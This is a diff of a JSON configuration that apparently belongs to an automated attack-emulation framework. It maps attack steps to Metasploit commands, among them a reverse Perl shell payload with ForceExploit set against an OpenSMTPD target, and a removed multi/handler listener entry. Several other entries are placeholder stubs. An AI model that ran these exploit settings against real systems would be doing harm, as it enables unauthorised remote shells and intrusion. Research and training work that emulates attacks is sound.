@@ -13,7 +13,7 @@
         "wait_time": "25",
         "config": ""
       },
-      "addSSHkey": {
+      "smtp_server": {
         "instructions": "back \n set payload cmd/unix/reverse_perl \n set ForceExploit true \n set DB_WORKSPACE . \n set RHOSTS {} \n set LISTENER {} \n set LPORT {LPORT} \n resource /data/attacker/custom_attacks/smtpd/attacco_opensmtpd_mod.rc",
         "attack_type": "ResourceAttack",
         "wait_time": "60",
@@ -25,12 +25,6 @@
         "attack_type": "ResourceAttack",
         "wait_time": "30",
         "config": "../stack/data/attacker/custom_attacks/docker_escape/config_rc.json"
-      },
-      "escape": {
-        "instructions": "back\n use exploit/multi/handler\nset LHOST {}\nset LPORT{LPORT}\nexploit",
-        "attack_type": "NotImplementedAttack",
-        "wait_time": "10",
-        "config": ""
       },
       "compromise": {
         "instructions": "echo no compromise attack",
@@ -62,6 +56,12 @@
       "wait_time": "10",
       "config": ""
     },
+    "addSSHkey": {
+      "instructions": "echo no addSSHkey attack",
+      "attack_type": "NotImplementedAttack",
+      "wait_time": "1",
+      "config": ""
+    },
     "remoteShell": {
       "instructions": "echo no remoteShell attack",
       "attack_type": "NotImplementedAttack",
@@ -74,8 +74,8 @@
       "wait_time": "1",
       "config": ""
     },
-    "smtp_server": {
-      "instructions": "echo no smtp_server attack",
+    "escapeHost": {
+      "instructions": "echo no escapeHost attack",
       "attack_type": "NotImplementedAttack",
       "wait_time": "1",
       "config": ""
@@ -121,12 +121,6 @@
       "attack_type": "NotImplementedAttack",
       "wait_time": "1",
       "config": ""
-    },
-    "escapeHost": {
-      "instructions": "echo no escapeHost attack",
-      "attack_type": "NotImplementedAttack",
-      "wait_time": "1",
-      "config": ""
     }
    },
 
@@ -164,4 +158,3 @@
   
   
 }
-
